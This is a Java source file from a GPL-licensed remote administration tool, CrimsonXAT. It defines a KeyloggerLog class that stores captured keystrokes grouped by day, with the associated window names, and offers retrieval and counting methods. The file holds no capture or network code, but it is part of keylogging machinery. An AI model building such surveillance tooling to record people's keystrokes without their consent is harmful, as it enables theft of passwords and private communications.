/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.universal.containers;



import java.io.Serializable;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.universal.Logger;

public class KeyloggerLog implements Serializable {

	private static final long serialVersionUID = 1L;
	public ArrayList<Day> keydays;

	public KeyloggerLog() {
		keydays = new ArrayList<Day>();

	}

	public void add(Day[] days) {
		// Logger.add("Adding day array of length: " + days.length);
		// replace these days in the log
		for (Day d : days) {
			// remove these days

			for (int i = 0; i < keydays.size(); i++) {
				Day e = keydays.get(i);
				if (d.sameDay(e.date)) {
					// Logger.add("Same day; remove");
					keydays.remove(i);
					break;
				} else {
					// Logger.add("Different day; keep");
				}
			}

			keydays.add(d);
		}

	}

	private boolean hasDay(Day d) {
		boolean flag = false;
		for (Day e : keydays) {
			if (e.sameDay(d.date)) {
				flag = true;
			}
		}
		return flag;
	}

	public void add(String s, Date d, String w) {
		// find right day and add it
		// System.out.println("Keydays length: " + keydays.size());
		boolean added = false;
		for (Day day : keydays) {
			if (day == null) {
				Logger.debug("Found null day. Something is wrong");
				continue;
			}
			if (day.sameDay(d)) {
				// Logger.debug("Adding to existing day");
				day.add(s, w, d);
				added = true;
				break;
			}
		}
		if (!added) {
			// new day
			// Logger.debug("Adding new day to keylog: " + d.toString());
			keydays.add(new Day(s, d, w));
		}

	}

	public void add(String[] s, Date d, String w) {
		for (String ss : s) {
			add(ss, d, w);
		}
	}

	public ArrayList<Key> getKeys(Date date) {

		for (Day day : keydays) {
			if (day.sameDay(date)) {
				// found the right day

				return day.log;
			}
		}
		return null;

	}

	public Date[] getDates() {

		ArrayList<Date> list = new ArrayList<Date>();

		for (Day d : keydays) {
			list.add(d.date);
		}
		Date[] dates = new Date[list.size()];
		for (int i = 0; i < list.size(); i++) {
			dates[i] = list.get(i);

		}
		return dates;

	}

	public Day[] getLast(int chars) {
		ArrayList<Day> daysNeeded = new ArrayList<Day>();

		for (int i = keydays.size() - 1; i >= 0; i--) {
			String log = keydays.get(i).asString();

			daysNeeded.add(keydays.get(i));
			if (log.length() > chars) {
				// this is far enough back
				break;
			} else {
				chars -= log.length();
			}

		}
		Day[] days = new Day[daysNeeded.size()];
		for (int i = 0, j = days.length - 1; i < days.length; i++, j--) {
			days[i] = daysNeeded.get(j);
		}

		return days;
	}

	public int totalKeys() {
		int total = 0;

		for (Day d : keydays) {
			total += d.keys();
		}

		return total;
	}

	public double averageKeys() {
		return (double) totalKeys() / (double) keydays.size();
	}
}
